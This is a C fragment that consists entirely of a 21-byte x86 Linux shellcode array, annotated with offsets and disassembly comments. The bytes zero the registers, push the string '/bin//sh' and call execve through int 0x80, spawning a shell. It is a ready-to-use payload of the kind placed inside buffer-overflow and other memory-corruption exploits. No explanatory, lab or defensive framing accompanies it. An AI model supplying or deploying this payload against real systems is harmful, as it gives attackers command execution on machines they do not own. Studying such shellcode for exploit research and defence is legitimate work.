
#define SH_SIZE 21

char SH[] = {
  /* 0000 */ "\x31\xc9"             /* xor ecx, ecx    */
  /* 0002 */ "\xf7\xe1"             /* mul ecx         */
  /* 0004 */ "\x52"                 /* push edx        */
  /* 0005 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f */
  /* 000A */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f */
  /* 000F */ "\x54"                 /* push esp        */
  /* 0010 */ "\x5b"                 /* pop ebx         */
  /* 0011 */ "\xb0\x0b"             /* mov al, 0xb     */
  /* 0013 */ "\xcd\x80"             /* int 0x80        */
};